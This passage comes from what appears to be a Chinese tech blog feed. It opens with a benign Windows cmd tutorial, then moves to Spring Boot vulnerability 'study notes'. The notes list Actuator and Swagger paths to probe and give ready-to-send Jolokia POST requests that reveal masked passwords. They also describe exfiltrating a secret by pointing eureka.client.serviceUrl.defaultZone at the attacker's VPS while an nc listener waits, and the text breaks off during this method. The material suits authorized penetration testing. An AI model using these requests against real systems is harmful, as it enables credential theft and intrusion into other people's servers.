class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">-a或--all：显示所有连线中的Socket；</span><br><span class="line">  -A&lt;网络类型&gt;或--&lt;网络类型&gt;：列出该网络类型连线中的相关地址；</span><br><span class="line">  -c或--continuous：持续列出网络状态；</span><br><span class="line">  -C或--cache：显示路由器配置的快取信息；</span><br><span class="line">  -e或--extend：显示网络其他相关信息；</span><br><span class="line">  -F或--fib：显示FIB；</span><br><span class="line">  -g或--groups：显示多重广播功能群组组员名单；</span><br><span class="line">  -h或--help：在线帮助；</span><br><span class="line">  -i或--interfaces：显示网络界面信息表单；</span><br><span class="line">  -l或--listening：显示监控中的服务器的Socket；</span><br><span class="line">  -M或--masquerade：显示伪装的网络连线；</span><br><span class="line">  -n或--numeric：直接使用ip地址，而不通过域名服务器；</span><br><span class="line">  -N或--netlink或--symbolic：显示网络硬件外围设备的符号连接名称；</span><br><span class="line">  -o或--timers：显示计时器；</span><br><span class="line">  -p或--programs：显示正在使用Socket的程序识别码和程序名称；</span><br><span class="line">  -r或--route：显示Routing Table；</span><br><span class="line">  -s或--statistice：显示网络工作信息统计表；</span><br><span class="line">  -t或--tcp：显示TCP传输协议的连线状况；</span><br><span class="line">  -u或--udp：显示UDP传输协议的连线状况；</span><br><span class="line">  -v或--verbose：显示指令执行过程；</span><br><span class="line">  -V或--version：显示版本信息；</span><br><span class="line">  -w或--raw：显示RAW传输协议的连线状况；</span><br><span class="line">  -x或--unix：此参数的效果和指定&quot;-A unix&quot;参数相同；</span><br><span class="line">--ip或--inet：此参数的效果和指定&quot;-A inet&quot;参数相同。</span><br></pre></td></tr></table></figure><h3 id="1-12-find"><a href="#1-12-find" class="headerlink" title="1.12 find"></a><font style="color:rgb(0, 0, 0);">1.12 find</font></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find /？获取使用帮助</span><br><span class="line"></span><br><span class="line">netstat -ano|find &quot;.8&quot;   //使用管道符，进行模糊查询</span><br></pre></td></tr></table></figure><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211165743911.png" alt="image-20241211165743754"></p><h3 id="1-13-tracert"><a href="#1-13-tracert" class="headerlink" title="1.13 tracert"></a><font style="color:rgb(0, 0, 0);">1.13 tracert</font></h3><p><strong><font style="color:rgb(51, 51, 51);">tracert</font></strong><font style="color:rgb(51, 51, 51);">也被称为</font><strong><font style="color:rgb(51, 51, 51);">Windows</font></strong><font style="color:rgb(0, 82, 217);">路由</font><font style="color:rgb(51, 51, 51);">跟踪实用程序，在命令提示符（cmd）中使用</font><strong><font style="color:rgb(51, 51, 51);">tracert</font></strong><font style="color:rgb(51, 51, 51);">命令可以用于确定IP数据包访问目标时所选择的路径。</font></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tracert /? 获取使用帮助</span><br></pre></td></tr></table></figure><h2 id="2-查看cmd下的命令"><a href="#2-查看cmd下的命令" class="headerlink" title="2. 查看cmd下的命令"></a><font style="color:rgb(0, 0, 0);">2. 查看cmd下的命令</font></h2><p><strong><font style="color:rgb(51, 51, 51);">1、使用help命令，查看所有的dos命令</font></strong></p><p><font style="color:rgb(51, 51, 51);">使用这个命令之后，我们可以看到所有的dos命令，并且后面还有中文的解释。简直不要太赞，这样我们就可以根据自己的需求要找到想要使用的命令。</font></p><p><strong><font style="color:rgb(51, 51, 51);">2、找到命令之后，使用 命令+ &#x2F;?来查看该命令下的其他属性</font></strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">命令 -help    <span class="comment">//第1种形式的使用帮助</span></span><br><span class="line"></span><br><span class="line">命令  /?       <span class="comment">//第2种形式的使用帮助</span></span><br></pre></td></tr></table></figure><p><strong><font style="color:rgb(51, 51, 51);">注意：这些字符只能是英文的</font></strong></p><h2 id="3-辅助符号或命令"><a href="#3-辅助符号或命令" class="headerlink" title="3. 辅助符号或命令"></a><font style="color:rgb(0, 0, 0);">3. 辅助符号或命令</font></h2><h3 id="3-1-‘-’"><a href="#3-1-‘-’" class="headerlink" title="3.1 ‘|’"></a><font style="color:rgb(0, 0, 0);">3.1 ‘|’</font></h3><p><strong><font style="color:rgb(51, 51, 51);">“|”cmd命令中|代表前一个的输出代表后一个的输入</font></strong></p><p><font style="color:rgb(51, 51, 51);">查找特定ip的网络连接及进程号：</font><code>&lt;font style=&quot;color:rgb(10, 191, 91);background-color:rgb(243, 245, 249);&quot;&gt;netstat -ano|find &quot;192.168.1.10&quot;&lt;/font&gt;</code></p><h3 id="3-2-重定向输出符号"><a href="#3-2-重定向输出符号" class="headerlink" title="3.2 重定向输出符号&gt; &gt;&gt;"></a><font style="color:rgb(0, 0, 0);">3.2 重定向输出符号&gt; &gt;&gt;</font></h3><p><font style="color:rgb(51, 51, 51);">将原本输出到命令窗口的内容，转存到文件中，如</font><code>&lt;font style=&quot;color:rgb(10, 191, 91);background-color:rgb(243, 245, 249);&quot;&gt;jstack 12912 &gt;d:/s.txt&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);"> 打印线程到指定文件</font></p><p><strong><font style="color:rgb(51, 51, 51);">cmd &gt;</font></strong><font style="color:rgb(51, 51, 51);"> 重定向输出并覆盖源文件。</font></p><p><strong><font style="color:rgb(51, 51, 51);">例如</font></strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo hello &gt;<span class="attr">c</span>:\<span class="number">1.</span>txt  <span class="comment">// 1.txt的文件内容先被清空，然后写入hello。</span></span><br></pre></td></tr></table></figure><p><strong><font style="color:rgb(51, 51, 51);">cmd &gt;&gt;重定向输出追加到文件末尾</font></strong></p><p><strong><font style="color:rgb(51, 51, 51);">例如：</font></strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo hello &gt;&gt;<span class="attr">c</span>:\<span class="number">1.</span>txt  <span class="comment">// 在1.txt文件末尾加上hello</span></span><br></pre></td></tr></table></figure><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211165748443.png" alt="image-20241211165748263"></p><h3 id="3-3-重定向输入符号"><a href="#3-3-重定向输入符号" class="headerlink" title="3.3 重定向输入符号&lt; &lt;&lt;"></a><font style="color:rgb(0, 0, 0);">3.3 重定向输入符号&lt; &lt;&lt;</font></h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd &lt; file</span><br></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 51);">使cmd命令从file读入</font></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd &lt;&lt; text</span><br></pre></td></tr></table></figure><p><strong><font style="color:rgb(51, 51, 51);">从命令行读取输入，直到一个与text相同的行结束。</font></strong></p><p><font style="color:rgb(51, 51, 51);">除非使用引号把输入括起来，此模式将对输入内容进行</font><strong><font style="color:rgb(51, 51, 51);">shell</font></strong><font style="color:rgb(51, 51, 51);">变量替换。</font></p><p><font style="color:rgb(51, 51, 51);">如果使用 &lt;&lt;- ，则会忽略接下来输入行首的tab，结束行也可以是一堆tab再加上一个与text相同的内容，可以参考后面的例子。</font></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd &lt;&lt;&lt; word</span><br></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 51);">把word（而不是文件word）和后面的换行作为输入提供给cmd。</font></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd &lt;&gt; file</span><br></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 51);">以读写模式把文件file重定向到输入，文件file不会被破坏。仅当应用程序利用了这一特性时，它才是有意义的。</font></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd &gt;| file</span><br></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 51);">功能同&gt;，但即便在设置了noclobber时也会覆盖file文件，注意用的是|而非一些书中说的!，目前仅在csh中仍沿用&gt;!实现这一功能。</font></p><h3 id="3-4-终止一直在运行的命令ctrl-c"><a href="#3-4-终止一直在运行的命令ctrl-c" class="headerlink" title="3.4 终止一直在运行的命令ctrl+c"></a><font style="color:rgb(0, 0, 0);">3.4 终止一直在运行的命令ctrl+c</font></h3><p><font style="color:rgb(51, 51, 51);">有时某个命令一直打印输出结果(如</font><code>&lt;font style=&quot;color:rgb(10, 191, 91);background-color:rgb(243, 245, 249);&quot;&gt;ping www.baidu.com&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">)，我们想终止这个命令的执行，直接按</font><code>&lt;font style=&quot;color:rgb(10, 191, 91);background-color:rgb(243, 245, 249);&quot;&gt;ctrl+c&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">即可。</font></p><h3 id="3-5-清空cmd窗口内容命令cls"><a href="#3-5-清空cmd窗口内容命令cls" class="headerlink" title="3.5 清空cmd窗口内容命令cls"></a><font style="color:rgb(0, 0, 0);">3.5 清空cmd窗口内容命令cls</font></h3><p><font style="color:rgb(51, 51, 51);">有时cmd内容太多，滚动费尽，需要清空屏幕内容，直接输入cls即可</font></p><p><strong><font style="color:rgb(51, 51, 51);">cmd命令中，按键盘的向上箭头可以直接前一个命令</font></strong></p><h2 id="4-附加一些Windows下的快捷键"><a href="#4-附加一些Windows下的快捷键" class="headerlink" title="4. 附加一些Windows下的快捷键"></a><font style="color:rgb(0, 0, 0);">4. 附加一些Windows下的快捷键</font></h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">win+E                 打开文件管器</span><br><span class="line"></span><br><span class="line">win+D                 显示桌面</span><br><span class="line"></span><br><span class="line">win+L                 锁计算机</span><br><span class="line"></span><br><span class="line">alt+<span class="variable constant_">F4</span>                 关闭当前程序</span><br><span class="line"></span><br><span class="line">ctrl+shift+<span class="title class_">Esc</span>    打开任务管理器（或者ctrl+alt+<span class="keyword">delete</span>）</span><br><span class="line"></span><br><span class="line">ctrl+F                  在一个文本或者网页里面查找，相当实用（退出一般按<span class="variable constant_">ESC</span>）</span><br><span class="line"></span><br><span class="line">ctrl+A                  选中所有文本</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 计算机基础知识 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SpringBoot相关漏洞学习资料</title>
      <link href="/2024/12/12/SpringBoot%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/"/>
      <url>/2024/12/12/SpringBoot%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/</url>
      
        <content type="html"><![CDATA[<h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><blockquote><p><strong>⚠️ 本项目所有内容仅作为安全研究和授权测试使用, 相关人员对因误用和滥用该项目造成的一切损害概不负责</strong></p></blockquote><h2 id="零：路由和版本"><a href="#零：路由和版本" class="headerlink" title="零：路由和版本"></a>零：路由和版本</h2><h3 id="0x01：路由知识"><a href="#0x01：路由知识" class="headerlink" title="0x01：路由知识"></a>0x01：路由知识</h3><ul><li>有些程序员会自定义 <code>/manage</code>、<code>/management</code> 、<strong>项目 App 相关名称</strong>为 spring 根路径</li><li>Spring Boot Actuator 1.x 版本默认内置路由的起始路径为 <code>/</code> ，2.x 版本则统一以 <code>/actuator</code> 为起始路径</li><li>Spring Boot Actuator 默认的内置路由名字，如 <code>/env</code> 有时候也会被程序员修改，比如修改成 <code>/appenv</code></li></ul><h3 id="0x02：版本知识"><a href="#0x02：版本知识" class="headerlink" title="0x02：版本知识"></a>0x02：版本知识</h3><blockquote><p>Spring Cloud 是基于 Spring Boot 来进行构建服务，并提供如配置管理、服务注册与发现、智能路由等常见功能的帮助快速开发分布式系统的系列框架的有序集合。</p></blockquote><h4 id="组件版本的相互依赖关系："><a href="#组件版本的相互依赖关系：" class="headerlink" title="组件版本的相互依赖关系："></a>组件版本的相互依赖关系：</h4><table><thead><tr><th>依赖项</th><th>版本列表及依赖组件版本</th></tr></thead><tbody><tr><td>spring-boot-starter-parent</td><td><a href="https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-parent">spring-boot-starter-parent</a></td></tr><tr><td>spring-boot-dependencies</td><td><a href="https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-dependencies">spring-boot-dependencies</a></td></tr><tr><td>spring-cloud-dependencies</td><td><a href="https://mvnrepository.com/artifact/org.springframework.cloud/spring-cloud-dependencies">spring-cloud-dependencies</a></td></tr></tbody></table><h4 id="Spring-Cloud-与-Spring-Boot-版本之间的依赖关系："><a href="#Spring-Cloud-与-Spring-Boot-版本之间的依赖关系：" class="headerlink" title="Spring Cloud 与 Spring Boot 版本之间的依赖关系："></a>Spring Cloud 与 Spring Boot 版本之间的依赖关系：</h4><table><thead><tr><th>Spring Cloud 大版本</th><th>Spring Boot 版本</th></tr></thead><tbody><tr><td>Angel</td><td>兼容 Spring Boot 1.2.x</td></tr><tr><td>Brixton</td><td>兼容 Spring Boot 1.3.x、1.4.x</td></tr><tr><td>Camden</td><td>兼容 Spring Boot 1.4.x、1.5.x</td></tr><tr><td>Dalston</td><td>兼容 Spring Boot 1.5.x，不兼容 2.0.x</td></tr><tr><td>Edgware</td><td>兼容 Spring Boot 1.5.x，不兼容 2.0.x</td></tr><tr><td>Finchley</td><td>兼容 Spring Boot 2.0.x，不兼容 1.5.x</td></tr><tr><td>Greenwich</td><td>兼容 Spring Boot 2.1.x</td></tr><tr><td>Hoxton</td><td>兼容 Spring Boot 2.2.x</td></tr></tbody></table><h4 id="Spring-Cloud-小版本号的后缀及含义"><a href="#Spring-Cloud-小版本号的后缀及含义" class="headerlink" title="Spring Cloud 小版本号的后缀及含义:"></a>Spring Cloud 小版本号的后缀及含义:</h4><table><thead><tr><th>小版本号后缀</th><th>含义</th></tr></thead><tbody><tr><td>BUILD-SNAPSHOT</td><td>快照版，代码不是固定，处于变化之中</td></tr><tr><td>MX</td><td>里程碑版</td></tr><tr><td>RCX</td><td>候选发布版</td></tr><tr><td>RELEASE</td><td>正式发布版</td></tr><tr><td>SRX</td><td>(修复错误和 bug 并再次发布的)正式发布版</td></tr></tbody></table><h2 id="一：信息泄露"><a href="#一：信息泄露" class="headerlink" title="一：信息泄露"></a>一：信息泄露</h2><h3 id="0x01：路由地址及接口调用详情泄漏"><a href="#0x01：路由地址及接口调用详情泄漏" class="headerlink" title="0x01：路由地址及接口调用详情泄漏"></a>0x01：路由地址及接口调用详情泄漏</h3><blockquote><p>开发人员没有意识到地址泄漏会导致安全隐患或者开发环境切换为线上生产环境时，相关人员没有更改配置文件，忘记切换环境配置等</p></blockquote><p>直接访问以下两个 swagger 相关路由，验证漏洞是否存在：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/v2/api-docs</span><br><span class="line">/swagger-ui.html</span><br></pre></td></tr></table></figure><p>其他一些可能会遇到的 swagger、swagger codegen、swagger-dubbo 等相关接口路由：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/swagger</span><br><span class="line">/api-docs</span><br><span class="line">/api.html</span><br><span class="line">/swagger-ui</span><br><span class="line">/swagger/codes</span><br><span class="line">/api/index.html</span><br><span class="line">/api/v2/api-docs</span><br><span class="line">/v2/swagger.json</span><br><span class="line">/swagger-ui/html</span><br><span class="line">/distv2/index.html</span><br><span class="line">/swagger/index.html</span><br><span class="line">/sw/swagger-ui.html</span><br><span class="line">/api/swagger-ui.html</span><br><span class="line">/static/swagger.json</span><br><span class="line">/user/swagger-ui.html</span><br><span class="line">/swagger-ui/index.html</span><br><span class="line">/swagger-dubbo/api-docs</span><br><span class="line">/template/swagger-ui.html</span><br><span class="line">/swagger/static/index.html</span><br><span class="line">/dubbo-provider/distv2/index.html</span><br><span class="line">/spring-security-rest/api/swagger-ui.html</span><br><span class="line">/spring-security-oauth-resource/swagger-ui.html</span><br></pre></td></tr></table></figure><p>除此之外，下面的 spring boot actuator 相关路由有时也会包含(或推测出)一些接口地址信息，但是无法获得参数相关信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/mappings</span><br><span class="line">/metrics</span><br><span class="line">/beans</span><br><span class="line">/configprops</span><br><span class="line">/actuator/metrics</span><br><span class="line">/actuator/mappings</span><br><span class="line">/actuator/beans</span><br><span class="line">/actuator/configprops</span><br></pre></td></tr></table></figure><p><strong>一般来讲，暴露出 spring boot 应用的相关接口和传参信息并不能算是漏洞</strong>，但是以 “<strong>默认安全</strong>“ 来讲，不暴露出这些信息更加安全。</p><p>对于攻击者来讲，一般会仔细审计暴露出的接口以增加对业务系统的了解，并会同时检查应用系统是否存在未授权访问、越权等其他业务类型漏洞。</p><h3 id="0x02：配置不当而暴露的路由"><a href="#0x02：配置不当而暴露的路由" class="headerlink" title="0x02：配置不当而暴露的路由"></a>0x02：配置不当而暴露的路由</h3><blockquote><p>主要是因为程序员开发时没有意识到暴露路由可能会造成安全风险，或者没有按照标准流程开发，忘记上线时需要修改&#x2F;切换生产环境的配置</p></blockquote><p>参考 <a href="https://docs.spring.io/spring-boot/docs/1.5.10.RELEASE/reference/htmlsingle/#production-ready-endpoints">production-ready-endpoints</a> 和 <a href="https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt">spring-boot.txt</a>，可能因为配置不当而暴露的默认内置路由可能会有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">/actuator</span><br><span class="line">/auditevents</span><br><span class="line">/autoconfig</span><br><span class="line">/beans</span><br><span class="line">/caches</span><br><span class="line">/conditions</span><br><span class="line">/configprops</span><br><span class="line">/docs</span><br><span class="line">/dump</span><br><span class="line">/env</span><br><span class="line">/flyway</span><br><span class="line">/health</span><br><span class="line">/heapdump</span><br><span class="line">/httptrace</span><br><span class="line">/info</span><br><span class="line">/intergrationgraph</span><br><span class="line">/jolokia</span><br><span class="line">/logfile</span><br><span class="line">/loggers</span><br><span class="line">/liquibase</span><br><span class="line">/metrics</span><br><span class="line">/mappings</span><br><span class="line">/prometheus</span><br><span class="line">/refresh</span><br><span class="line">/scheduledtasks</span><br><span class="line">/sessions</span><br><span class="line">/shutdown</span><br><span class="line">/trace</span><br><span class="line">/threaddump</span><br><span class="line">/actuator/auditevents</span><br><span class="line">/actuator/beans</span><br><span class="line">/actuator/health</span><br><span class="line">/actuator/conditions</span><br><span class="line">/actuator/configprops</span><br><span class="line">/actuator/env</span><br><span class="line">/actuator/info</span><br><span class="line">/actuator/loggers</span><br><span class="line">/actuator/heapdump</span><br><span class="line">/actuator/threaddump</span><br><span class="line">/actuator/metrics</span><br><span class="line">/actuator/scheduledtasks</span><br><span class="line">/actuator/httptrace</span><br><span class="line">/actuator/mappings</span><br><span class="line">/actuator/jolokia</span><br><span class="line">/actuator/hystrix.stream</span><br></pre></td></tr></table></figure><p>其中对寻找漏洞比较重要接口的有：</p><ul><li><p><code>/env</code>、<code>/actuator/env</code></p><p>GET 请求 <code>/env</code> 会直接泄露环境变量、内网地址、配置中的用户名等信息；当程序员的属性名命名不规范，例如 password 写成 psasword、pwd 时，会泄露密码明文；</p><p>同时有一定概率可以通过 POST 请求 <code>/env</code> 接口设置一些属性，间接触发相关 RCE 漏洞；同时有概率获得星号遮掩的密码、密钥等重要隐私信息的明文。</p></li><li><p><code>/refresh</code>、<code>/actuator/refresh</code></p><p>POST 请求 <code>/env</code> 接口设置属性后，可同时配合 POST 请求 <code>/refresh</code> 接口刷新属性变量来触发相关 RCE 漏洞。</p></li><li><p><code>/restart</code>、<code>/actuator/restart</code></p><p>暴露出此接口的情况较少；可以配合 POST请求 <code>/env</code> 接口设置属性后，再 POST 请求 <code>/restart</code> 接口重启应用来触发相关 RCE 漏洞。</p></li><li><p><code>/jolokia</code>、<code>/actuator/jolokia</code></p><p>可以通过 <code>/jolokia/list</code> 接口寻找可以利用的 MBean，间接触发相关 RCE 漏洞、获得星号遮掩的重要隐私信息的明文等。</p></li><li><p><code>/trace</code>、<code>/actuator/httptrace</code></p><p>一些 http 请求包访问跟踪信息，有可能在其中发现内网应用系统的一些请求信息详情；以及有效用户或管理员的 cookie、jwt token 等信息。</p></li></ul><h3 id="0x03：获取被星号脱敏的密码的明文-方法一"><a href="#0x03：获取被星号脱敏的密码的明文-方法一" class="headerlink" title="0x03：获取被星号脱敏的密码的明文 (方法一)"></a>0x03：获取被星号脱敏的密码的明文 (方法一)</h3><blockquote><p>访问 &#x2F;env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果</p></blockquote><h4 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</li><li>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）</li></ul><h4 id="利用方法："><a href="#利用方法：" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：-找到想要获取的属性名"><a href="#步骤一：-找到想要获取的属性名" class="headerlink" title="步骤一： 找到想要获取的属性名"></a>步骤一： 找到想要获取的属性名</h5><p>GET 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p><h5 id="步骤二：-jolokia-调用相关-Mbean-获取明文"><a href="#步骤二：-jolokia-调用相关-Mbean-获取明文" class="headerlink" title="步骤二： jolokia 调用相关 Mbean 获取明文"></a>步骤二： jolokia 调用相关 Mbean 获取明文</h5><p>将下面示例中的 <code>security.user.password</code> 替换为实际要获取的属性名，直接发包；明文值结果包含在 response 数据包中的 <code>value</code> 键中。</p><ul><li>调用 <code>org.springframework.boot</code> Mbean</li></ul><blockquote><p>实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法</p></blockquote><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"> </span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"> </span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure><ul><li>调用 <code>org.springframework.cloud.context.environment</code> Mbean</li></ul><blockquote><p>实际上是调用 org.springframework.cloud.context.environment.EnvironmentManager 类实例的 getProperty 方法</p></blockquote><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"> </span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"> </span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure><ul><li>调用其他 Mbean</li></ul><blockquote><p>目标具体情况和存在的 Mbean 可能不一样，可以搜索 getProperty 等关键词，寻找可以调用的方法。</p></blockquote><h3 id="0x04：获取被星号脱敏的密码的明文-方法二"><a href="#0x04：获取被星号脱敏的密码的明文-方法二" class="headerlink" title="0x04：获取被星号脱敏的密码的明文 (方法二)"></a>0x04：获取被星号脱敏的密码的明文 (方法二)</h3><h4 id="利用条件：-1"><a href="#利用条件：-1" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>可以 GET 请求目标网站的 <code>/env</code></li><li>可以 POST 请求目标网站的 <code>/env</code></li><li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li><li>目标使用了 <code>spring-cloud-starter-netflix-eureka-client</code> 依赖</li><li>目标可以请求攻击者的服务器（请求可出外网）</li></ul><h4 id="利用方法：-1"><a href="#利用方法：-1" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：-找到想要获取的属性名-1"><a href="#步骤一：-找到想要获取的属性名-1" class="headerlink" title="步骤一： 找到想要获取的属性名"></a>步骤一： 找到想要获取的属性名</h5><p>GET 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p><h5 id="步骤二：-使用-nc-监听-HTTP-请求"><a href="#步骤二：-使用-nc-监听-HTTP-请求" class="headerlink" title="步骤二： 使用 nc 监听 HTTP 请求"></a>步骤二： 使用 nc 监听 HTTP 请求</h5><p>在自己控制的外网服务器上监听 80 端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc -lvk 80</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h5 id="步骤三：-设置-eureka-client-serviceUrl-defaultZone-属性"><a href="#步骤三：-设置-eureka-client-serviceUrl-defaultZone-属性" class="headerlink" title="步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性"></a>步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性</h5><p>将下面 <code>http://value:$&#123;security.user.password&#125;@your-vps-ip</code> 中的 <code>security.user.password</code> 换成自己想要获取的对应的星号 * 遮掩的属性名；</p><p><code>your-vps-ip</code> 换成自己外网服务器的真实 ip 地址。</p><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td 